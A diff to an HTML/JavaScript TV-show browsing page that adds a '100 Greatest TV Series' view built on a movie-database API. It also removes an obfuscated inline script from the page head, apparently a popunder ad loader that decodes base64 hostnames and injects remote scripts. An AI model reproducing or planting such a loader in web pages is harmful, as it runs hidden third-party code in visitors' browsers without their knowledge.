@@ -76,7 +76,6 @@
         .favorite-btn i.far { color: #fff; }
         .watchlater-btn i.fas { color: #4caf50; }
         .watchlater-btn i.far { color: #fff; }
-        .favorite-btn:hover, .watchlater-btn:hover { transform: scale(1.1); background: rgba(0,0,0,0.8); }
         .pagination {
             display: flex; justify-content: center; gap: 12px; margin: 30px 0;
         }
@@ -115,11 +114,6 @@
             .tv-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; }
         }
     </style>
-    <script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var q=window,f="cc878073e7a6ce2e44e76e4259a40690",m=[["siteId",312-918*765+84+5947022],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],e=["d3d3LnZpc2FyaW9tZWRpYS5jb20vbWh0bWxnbC5taW4uY3Nz","ZDEzazdwcmF4MXlpMDQuY2xvdWRmcm9udC5uZXQvWkZjeFl1L3lqcXVlcnkuc3RpY2t5TmF2YmFyLm1pbi5qcw=="],g=-1,p,s,z=function(){clearTimeout(s);g++;if(e[g]&&!(1803486699000<(new Date).getTime()&&1<g)){p=q.document.createElement("script");p.type="text/javascript";p.async=!0;var x=q.document.getElementsByTagName("script")[0];p.src="https://"+atob(e[g]);p.crossOrigin="anonymous";p.onerror=z;p.onload=function(){clearTimeout(s);q[f.slice(0,16)+f.slice(0,16)]||z()};s=setTimeout(z,5E3);x.parentNode.insertBefore(p,x)}};if(!q[f]){try{Object.freeze(q[f]=m)}catch(e){}z()}})();
-/*]]>/* */
-</script>
 </head>
 <body>
 
@@ -143,6 +137,7 @@
             <input type="text" id="searchTV" placeholder="Search TV shows...">
         </div>
         <div class="genre-buttons" id="genreButtons">
+            <button id="greatestTvBtn" class="genre-btn">🏆 100 Greatest TV Series</button>
             <button data-genre="10768" class="genre-btn active">War & Politics</button>
             <button data-genre="28" class="genre-btn">Action</button>
             <button data-genre="35" class="genre-btn">Comedy</button>
@@ -172,6 +167,7 @@
     let currentPage = 1;
     let totalPages = 1;
     let currentSearch = '';
+    let isGreatestMode = false;
     
     let favorites = JSON.parse(localStorage.getItem('alb_favorites')) || [];
     let watchlist = JSON.parse(localStorage.getItem('alb_watchlist')) || [];
@@ -295,6 +291,33 @@
         return card;
     }
     
+    async function loadGreatestTVSeries(page = 1) {
+        const grid = document.getElementById('tvShowsGrid');
+        const pagContainer = document.getElementById('tvPagination');
+        grid.innerHTML = '<div style="grid-column:1/-1; text-align:center; padding:40px;">Loading...</div>';
+        try {
+            const url = `${BASE}/tv/top_rated?api_key=${API_KEY}&language=en-US&page=${page}&vote_count.gte=500`;
+            const res = await fetch(url);
+            const data = await res.json();
+            totalPages = Math.min(data.total_pages, 10);
+            grid.innerHTML = '';
+            data.results.forEach(show => {
+                if (show.poster_path) grid.appendChild(createCard(show));
+            });
+            pagContainer.innerHTML = '';
+            for (let i = 1; i <= totalPages; i++) {
+                const btn = document.createElement('button');
+                btn.textContent = i;
+                btn.className = `page-btn ${i === page ? 'active' : ''}`;
+                btn.onclick = () => loadGreatestTVSeries(i);
+                pagContainer.appendChild(btn);
+            }
+        } catch(e) {
+            console.error(e);
+            grid.innerHTML = '<div style="grid-column:1/-1; text-align:center;">Error loading TV shows</div>';
+        }
+    }
+    
     async function loadTVShows(page = 1, genre = currentGenre, search = '') {
         const grid = document.getElementById('tvShowsGrid');
         grid.innerHTML = '<div style="grid-column:1/-1; text-align:center; padding:40px;">Loading TV shows...</div>';
@@ -333,7 +356,29 @@
         }
     }
     
+    function resetToGenreMode() {
+        isGreatestMode = false;
+        currentSearch = '';
+        document.getElementById('searchTV').value = '';
+        currentPage = 1;
+        loadTVShows(1, currentGenre, '');
+    }
+    
+    document.getElementById('greatestTvBtn').addEventListener('click', (e) => {
+        e.preventDefault();
+        isGreatestMode = true;
+        document.querySelectorAll('.genre-btn').forEach(btn => btn.classList.remove('active'));
+        e.target.classList.add('active');
+        loadGreatestTVSeries(1);
+    });
+    
     document.getElementById('searchTV').addEventListener('input', (e) => {
+        if (isGreatestMode) {
+            isGreatestMode = false;
+            document.querySelectorAll('.genre-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelector('.genre-btn.active')?.classList.remove('active');
+            currentGenre = 10768;
+        }
         currentSearch = e.target.value;
         if (currentSearch.length >= 3) {
             currentPage = 1;
@@ -347,7 +392,9 @@
     });
     
     document.querySelectorAll('.genre-btn').forEach(btn => {
+        if (btn.id === 'greatestTvBtn') return;
         btn.onclick = () => {
+            isGreatestMode = false;
             document.querySelectorAll('.genre-btn').forEach(b => b.classList.remove('active'));
             btn.classList.add('active');
             currentGenre = parseInt(btn.dataset.genre);
